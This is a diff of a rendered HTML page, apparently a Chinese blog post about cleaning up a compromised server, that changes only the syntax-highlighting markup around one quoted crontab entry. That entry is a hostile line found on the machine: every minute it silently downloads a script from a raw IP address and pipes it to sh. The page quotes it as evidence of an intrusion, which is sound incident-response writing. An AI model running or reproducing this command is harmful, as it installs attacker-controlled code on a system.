@@ -149,9 +149,8 @@
   <li>
     <ol>
       <li>检查 <code class="highlighter-rouge">crontab -l </code> 发现了一个莫名其妙的 job
-        <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> wget -q -O - http://185.222.210.59/cr.sh | sh &gt; /dev/null 2&gt;&amp;1
-</code></pre>
-        </div>
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> wget <span class="nt">-q</span> <span class="nt">-O</span> - http://185.222.210.59/cr.sh | sh <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
+</code></pre></div>        </div>
       </li>
     </ol>
   </li>
